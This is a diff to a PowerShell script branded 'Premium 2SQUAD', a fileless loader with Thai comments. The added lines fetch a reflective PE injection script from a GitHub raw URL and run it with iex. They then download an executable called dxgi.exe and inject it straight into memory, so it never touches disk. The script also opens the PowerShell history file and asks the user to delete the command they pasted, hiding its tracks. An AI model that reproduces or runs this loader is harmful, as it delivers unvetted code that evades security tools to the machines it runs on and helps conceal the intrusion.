@@ -1,5 +1,5 @@
 # =========================================================================
-# PREMIUM 2SQUAD - FILELESS EXE LOADER
+# PREMIUM 2SQUAD - FILELESS EXE LOADER (NATIVE C++)
 # =========================================================================
 $ErrorActionPreference = "SilentlyContinue"
 $host.UI.RawUI.WindowTitle = "PREMIUM 2SQUAD - LOADER"
@@ -24,45 +24,38 @@ $historyPath = (Get-PSReadLineOption).HistorySavePath
 if (Test-Path $historyPath) {
     Write-Host "  " -NoNewline; Write-Host "[" -ForegroundColor DarkGray -NoNewline; Write-Host "!" -ForegroundColor Red -NoNewline; Write-Host "]" -ForegroundColor DarkGray -NoNewline; Write-Host " Notepad opened. Please clear your link, SAVE, and CLOSE Notepad." -ForegroundColor Red
     
-    # เปิด Notepad ให้ลบประวัติคำสั่ง
     Start-Process notepad.exe -ArgumentList $historyPath -Wait 
     Write-Host "  " -NoNewline; Write-Host "[" -ForegroundColor DarkGray -NoNewline; Write-Host "+" -ForegroundColor Green -NoNewline; Write-Host "]" -ForegroundColor DarkGray -NoNewline; Write-Host " History cleaned securely." -ForegroundColor Green
 }
 Write-Host ""
 
 # ==========================================
-# FILELESS DOWNLOAD & EXECUTION (.EXE)
+# FILELESS DOWNLOAD & EXECUTION (REFLECTIVE PE)
 # ==========================================
 Write-Host "  " -NoNewline; Write-Host "[" -ForegroundColor DarkGray -NoNewline; Write-Host "*" -ForegroundColor Yellow -NoNewline; Write-Host "]" -ForegroundColor DarkGray -NoNewline; Write-Host " Connecting to secure server..." -ForegroundColor White
 
 [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
 
 try {
-    # ⚠️ ใส่ลิ้งก์ Raw ของไฟล์ .exe ของคุณบน GitHub ตรงนี้ ⚠️
-    $ExeURL = "https://raw.githubusercontent.com/ชื่อคุณ/ชื่อRepo/main/Premium2Squad.exe"
+    # 1. โหลดเครื่องมือ Reflective PE Injection กลับมา
+    $InjectorURL = "https://raw.githubusercontent.com/Vegusnerver/2squad/refs/heads/main/2squad.txt"
+    iex (New-Object Net.WebClient).DownloadString($InjectorURL)
+
+    # 2. ⚠️ ใส่ลิ้งก์ Raw ของไฟล์ .exe ของคุณบน GitHub ตรงนี้ ⚠️
+    $ExeURL = "https://raw.githubusercontent.com/Vegusnerver/2squad/main/dxgi.exe"
     
     $WebClient = New-Object System.Net.WebClient
     $ExeBytes = $WebClient.DownloadData($ExeURL)
     
     Write-Host "  " -NoNewline; Write-Host "[" -ForegroundColor DarkGray -NoNewline; Write-Host "+" -ForegroundColor Green -NoNewline; Write-Host "]" -ForegroundColor DarkGray -NoNewline; Write-Host " Payload ready ($($ExeBytes.Length) bytes)." -ForegroundColor Green
-    Write-Host "  " -NoNewline; Write-Host "[" -ForegroundColor DarkGray -NoNewline; Write-Host "*" -ForegroundColor Yellow -NoNewline; Write-Host "]" -ForegroundColor DarkGray -NoNewline; Write-Host " Executing in memory..." -ForegroundColor White
+    Write-Host "  " -NoNewline; Write-Host "[" -ForegroundColor DarkGray -NoNewline; Write-Host "*" -ForegroundColor Yellow -NoNewline; Write-Host "]" -ForegroundColor DarkGray -NoNewline; Write-Host " Executing C++ Native Payload in memory..." -ForegroundColor White
     
-    # โหลดไฟล์ EXE ลงไปในหน่วยความจำของ PowerShell เอง (Reflection)
-    $Assembly = [System.Reflection.Assembly]::Load($ExeBytes)
-    $EntryPoint = $Assembly.EntryPoint
+    Start-Sleep -Seconds 2
     
-    if ($EntryPoint -ne $null) {
-        Write-Host "`n  " -NoNewline; Write-Host "[" -ForegroundColor DarkGray -NoNewline; Write-Host "+" -ForegroundColor Green -NoNewline; Write-Host "]" -ForegroundColor DarkGray -NoNewline; Write-Host " Execution Successful! Starting Premium 2Squad..." -ForegroundColor Cyan
-        Start-Sleep -Seconds 2
-        
-        # รันโปรแกรมจาก Memory ทันที
-        $EntryPoint.Invoke($null, @($null))
-    } else {
-        Write-Host "`n  [!] Failed to find executable entry point." -ForegroundColor Red
-    }
-
+    # 3. สั่งรัน EXE เข้าไปใน Memory ของ PowerShell ตัวเองโดยตรง (ไม่ต้องใช้ PID แล้ว)
+    Invoke-ReflectivePEInjection -PEBytes $ExeBytes -ForceASLR
+    
 } catch {
     Write-Host "`n  [!] Execution Failed: $($_.Exception.Message)" -ForegroundColor Red
+    Write-Host "  [!] Make sure your C++ executable is compiled as 64-bit (x64)." -ForegroundColor Red
 }
-
-Start-Sleep -Seconds 5
